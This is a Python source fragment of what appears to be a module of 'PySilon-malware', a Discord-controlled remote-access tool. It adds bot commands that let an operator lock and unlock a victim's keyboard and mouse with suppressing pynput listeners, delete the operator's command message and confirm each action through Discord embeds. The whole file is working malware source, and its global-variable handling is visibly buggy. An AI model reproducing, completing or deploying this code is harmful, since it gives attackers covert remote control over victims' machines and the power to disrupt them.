from pynput import keyboard, mouse

global input_blocked
keyboard_listener = None
mouse_listener = None

@client.command(name="block-input")
async def block_input(ctx):

    if not input_blocked:
        await ctx.message.delete()

        async def on_press():
            pass

        async def on_release():
            pass

        async def on_click():
            pass

        keyboard_listener = keyboard.Listener(suppress=True)
        mouse_listener = mouse.Listener(suppress=True)

        keyboard_listener.start()
        mouse_listener.start()

        embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```',colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

        input_blocked = True
    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unblock it by using .unblock-input```',colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="unblock-input")
async def unblock_input(ctx):
    global input_blocked, keyboard_listener, mouse_listener

    if input_blocked:
        await ctx.message.delete()

        keyboard_listener.stop()
        mouse_listener.stop()

        embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```',colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

        input_blocked = False
    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .block-input```',colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)